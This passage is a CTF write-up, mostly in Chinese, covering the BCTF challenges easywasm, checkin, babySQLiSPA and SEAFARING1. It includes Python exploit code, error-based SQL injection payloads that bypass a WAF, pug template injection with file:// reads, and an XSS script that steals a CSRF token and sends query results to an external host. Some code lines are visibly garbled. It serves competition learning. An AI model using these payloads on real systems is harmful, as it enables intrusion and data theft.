    raw_input()
    p.send(payload + 'A' * 10000)
    #p.shutdown('write')
    p.interactive()
### easywasm
The WASM module is used to perform operation with the help of the outside
layer. Reversing the module we could easily found a buffer overflow caused by
`strcpy`. Since the module imports `__emscripten_run_script`, we could
overwrite the function pointer (which is actually a table index) and run some
javascript.
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import requests, sys, os, urllib, IPython
    s = requests.session()
    #URL = 'http://localhost:23333/'
    URL = 'http://39.96.13.247:9999/'
    def add_person(name, is_tutor=0):
        url = URL + 'add_person?'
        url += 'name=' + urllib.quote(name)
        url += '&is_tutor=' + urllib.quote(str(is_tutor))
        print url
        resp = s.get(url)
        if 'person id =' not in resp.content:
            raise Exception("Failed allocation")
        index = int(resp.content[resp.content.index(' = ') + 3:])
        return index
    def change_name(idx, name):
        url = URL + 'change_name?'
        url += 'id=' + urllib.quote(str(idx))
        url += '&name=' + urllib.quote(name)
        resp = s.get(url)
        print resp.content
        return 'done' in resp.content
    def intro(idx):
        url = URL + 'intro?'
        url += 'id=' + urllib.quote(str(idx))
        resp = s.get(url)
        return resp.content
    '''
    struct person_t {
     i32 idx;
     i32 in_use;
     u8 name[60];
     i32 func_idx;
    }
    '''
    base = 4064
    size = 72
    idx = add_person('123', 0)
    print idx
    payload = 'this.a = require("child_process");//'
    print len(payload)
    assert len(payload)  9999");//'
    assert len(payload) 
于是先找到4007C7对应的call的记录，于是就可以直接从0x52f0开始分析
利用这一份简单的代码解码之后直接把所有分支的判断结果提取出来，然后统计一波数量就可以出来了
    f = open('ttt')
    d = f.read()
    f.close()
    import re
    s = r'tnt8 ([N,T]+)'
    dd = re.findall(s,d)
    res = ''
    for i in dd:
        res += i
    sss = r'((NT)+)TTT'
    de2 = re.findall(sss,res)
    de = ''
    for i in de2:
        t = len(i[0])/2
        de += chr(t+0x20)
    print(de)
    # bctf{19c512c582879daf358404a9748cfdbb}!!
## Web
### checkin
输入一个不存在的url, 看404报错 提示:
> Powered by beego 1.7.2
之前再分析gitea/gogs的CVE-2018-18925/6时, 发现
go-macaron( version version {
      const fileterKeys = ['global', 'require']
      return /^[a-zA-z0-9\.]*$/g.test(upug) && !fileterKeys.some(t => upug.toLowerCase().includes(t))
    }
但是因为最后存储之前两边拼凑了`#{ }`
    ...
    console.log('Generator pug template')
    const uid = req.session.user.uid
    const body = `#{${upug}}`
    console.log('body', body)
    const upugPath = path.join('users', utils.md5(uid), `${uid}.pug`)
    console.log('upugPath', upugPath)
    try {
        fs.writeFileSync(path.resolve(config.VIEWS_PATH, upugPath), body)
    } catch (err) {
    ...
于是我们就可以直接进行ssti，但是注入的内容只能是字母数字和点，还不能包含`require`和`global`
渲染模板的时候有个要求 : **必须是本机访问**
  1. 以服务器做代理去访问一个url(用的puppeteer[chrome])，header取自发送url时的header，然后截图返回给你
这里的要求是:
    const checkURL = (shooturl) => {
      const myURL = new URL(shooturl)
      return config.SERVER_HOST.includes(myURL.host)
    }
你发送的url的host部分要在他本地的host之中，于是顺理成章的想到用这个功能做跳板执行render，同时可以使用`file://`协议任意文件读取。（host为空）
请求`/etc/passwd`
知道了这两点，我们再回到源码中找到flag的线索
审计 config.js 发现
    ...
    const FLAG_PATH = path.resolve(constant.ROOT_PATH, '********')
    ...
    const FLAGFILENAME = process.env.FLAGFILENAME || '********'
    ...
于是题目的目标就是得到这两个值，然后用`file://`去读取，同时我们审计`app.js`发现他将flagpath设置成静态目录
    .use(express.static(config.FLAG_PATH))
于是也可控制它通过`http://`协议读取flag
话不多说,`FLAG_PATH`和`FLAGFILENAME`是如何获取的呢？
首先利用设置模板功能实现`ssti`
先测试输入`this`，控制它去访问`/local/render`，发现返回结果是一个`global`对象
那么`FLAGFILENAME`就能很容易拿到：通过注入`process.env.FLAGFILENAME`，直接输出了`FLAGFILENAME`
但是因为他禁用了`require`，我们无法轻易拿到`FLAG_PATH`，就想到通过读取`config.js`的源码来拿
首先我们要找到Web路径，`process.env.PWD`是可以拿到，但因为它被解析做了html标签，chrome那边截图截不到，
这里可以利用`view-source:`让服务器的浏览器直接返回html源码
拿到了路径直接读`config.js`
拿到了flag路径读flag发现:
这里考察的是`Range`这个header成员的用法，控制返回的字节范围，通过改变`request
header`遍历字节范围，在大概2000的位置找到了flag  
### babySQLiSPA
api/hints可以注入  
waf:
    export function checkHint (hint) {
      return ! / |;|\+|-|\*|\/||~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`|gtid_subset|hash|json|st\_|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|sleep|benchmark/ig.test(hint)
    }
利用gtid_subtract爆table名字，但最多140字节
>
> hint='or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord('j')^ord('t')))),''))or'
长度30的时候拿到flag表：
> vhEFfFlLlLaAAaaggIiIIsSSHeReEE
然后再爆表
>
> hint='||gtid_subtract((select(concat(column_name))from(information_schema.columns)where(table_name='vhEFfFlLlLaAAaaggIiIIsSSHeReEE')),'')#
最后拿到flag  
`{"error":"Malformed GTID set specification
'BCTF{060950FB-839E-4B57-B91D-51E78F56856F}'."}`
### SEAFARING1
  * 评论链接bot会主动访问
  * view-source: 可以发现后台一些api和参数  
  * handle_message.php 存在反射型XSS  
  * bot使用的是firefox浏览器
于是构造html让bot访问
        ">
这里触发了反射型xss,引入了我写的js文件
    function req(url,data){
        var xhr = new XMLHttpRequest();
        xhr.open("POST",url,false);
        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr.send(data);
        var resp = xhr.responseText;
        return resp;
    }
    function getcsrf(){
        var xhr = new XMLHttpRequest();
        xhr.open("GET","http://seafaring.xctf.org.cn:9999/admin/index.php",false);
        xhr.send();
        var res = xhr.responseText;
        var csrftoken = res.match(/csrf_token = \"([a-z0-9]*)\"/ig)[0].split('= "')[1].replace('"','');
        return csrftoken;
    }
    function send(data){
        location.href = "http://data.ebcece08.w1n.pw/?data="+escape(data);
    }
    var ress = req("http://172.20.0.2:6379/","token="+getcsrf()+"&action=view_unreads&status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23");
    send(ress);
控制bot请求后台接口发现返回了`sqlquery debug`信息